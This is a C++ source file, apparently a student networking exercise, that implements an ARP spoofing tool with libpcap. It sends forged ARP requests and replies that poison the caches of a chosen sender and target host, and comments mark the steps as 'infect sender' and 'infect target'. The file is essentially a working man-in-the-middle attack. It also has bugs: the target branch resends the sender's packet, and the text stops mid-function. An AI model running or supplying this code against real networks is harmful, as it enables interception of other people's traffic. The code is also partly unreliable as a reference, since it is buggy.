#include <QCoreApplication>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <thread>

// Add class made by bearics
#include "arppacket.h"

using namespace std;

static ArpPacket a2s;
static ArpPacket a2t;

void getAttackerInfo(u_char* ip, u_char* mac);
void sendPkt(pcap_t *handle, u_char* send_pkt, int size);
void receivePkt(pcap_t *handle, struct pcap_pkthdr *header);

int main(int argc, char *argv[])
{
    pcap_t *handle;			/* Session handle */
    char *dev;			/* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    //struct bpf_program fp;		/* The compiled filter */
    //char filter_exp[] = "port ";	/* The filter expression */
    bpf_u_int32 mask;		/* Our netmask */
    bpf_u_int32 net;		/* Our IP */
    struct pcap_pkthdr *header;	/* The header that pcap gives us */

    // attacker's information
    u_char attackerIP[16];     // 255.255.255.255 = 15+1
    u_char attackerMAC[18];    // FF:FF:FF:FF:FF:FF = 17+1

    getAttackerInfo(attackerIP, attackerMAC);

    cout << "Attacker's IP : " << attackerIP <<endl;
    cout << "Attacker's MAC : " << attackerMAC<<endl;

    cout << "Setting packets " << endl;

    // eth0 senderIP targetIP

    // attacker send to sender
    a2s.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    a2s.setEtherSourceMac(attackerMAC);
    a2s.setArpOpcode(ARPOP_REQUEST);
    a2s.setArpSenderIP((u_char*)argv[3]);
    a2s.setArpSenderMac(attackerMAC);
    a2s.setArpTargetIP((u_char*)argv[2]);
    a2s.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    // attacker send to target
    a2t.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
    a2t.setEtherSourceMac(attackerMAC);
    a2t.setArpOpcode(ARPOP_REQUEST);
    a2t.setArpSenderIP((u_char*)argv[2]);
    a2t.setArpSenderMac(attackerMAC);
    a2t.setArpTargetIP((u_char*)argv[3]);
    a2t.setArpTargetMac((u_char*)"00:00:00:00:00:00");

    /* Define the device */
    dev = pcap_lookupdev(errbuf);;
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    printf("Device is %s\n", argv[1]);
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
        return(2);
    }
    a2s.printPkt();
    sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
    a2t.printPkt();
    sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));

    thread t(&receivePkt, handle, header);
    t.join();


}

void getAttackerInfo(u_char* attackerIP, u_char* attackerMAC)
{
    FILE *fp;

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 1p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerIP);
    pclose(fp);

    fp = popen( "ifconfig | grep -A3 \"inet\" | sed -n 3p | awk '{print $2}'", "r");
    fscanf(fp, "%s", attackerMAC);
    pclose(fp);

}

void sendPkt(pcap_t *handle, u_char* send_pkt, int size)
{
    if(pcap_sendpacket(handle, send_pkt, size) == -1)
        cout << "Sending ERROR!" << endl;
    else
        cout << "Sending SUCCESS!" << endl;
}

void receivePkt(pcap_t *handle, struct pcap_pkthdr *header)
{
    int res=0;
    const u_char *pkt;
    struct ether_header *eth;
    struct ether_arp *arp;
    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){
        eth=(struct ether_header *)pkt;
        arp=(struct ether_arp *)(pkt+ETH_HLEN);

        cout << "checking" << endl;
        if(ntohs(eth->ether_type) == ETHERTYPE_ARP) {

            if(memcmp(a2s.eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN) != 0) continue;

            for(int i=0;i<6;i++) printf(" %02x", a2s.arp->arp_sha[i]); printf("\n");
            for(int i=0;i<6;i++) printf(" %02x", arp->arp_tha[i]); printf("\n");
            printf("res : %d\n", ETHER_ADDR_LEN);
            printf("res : %d\n", memcmp(a2s.arp->arp_sha,arp->arp_tha, ETHER_ADDR_LEN));
            // check senderIP == received packet's sourceIP(=senderIP)
            if(memcmp(a2s.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0) {
                memcpy(a2s.eth->ether_dhost, eth->ether_shost, ETHER_ADDR_LEN);
                memcpy(a2s.arp->arp_tha, eth->ether_shost, ETHER_ADDR_LEN);
                a2s.setArpOpcode(ARPOP_REPLY);
                cout << "infect sender" << endl;
                a2s.printPkt();
                sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
                continue;
            } // check targetIP == received packet's sourceIP(=targetIP)
            else if(memcmp(a2t.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0) {
                memcpy(a2t.eth->ether_dhost, eth->ether_shost, ETHER_ADDR_LEN);
                memcpy(a2t.arp->arp_tha, eth->ether_shost, ETHER_ADDR_LEN);
                a2t.setArpOpcode(ARPOP_REPLY);
                cout << "infect target" << endl;
                a2t.printPkt();
                sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
                continue;
            }
            cout << "changed";
        }
        else{
            cout << "size : " << header->len << endl;
            // check senderIP == received packet's sourceIP(=senderIP)
            if(memcmp(a2s.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0){

            } // check targetIP == received packet's sourceIP(=targetIP)
            else if(memcmp(a2t.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0) {

            }
        }
    }
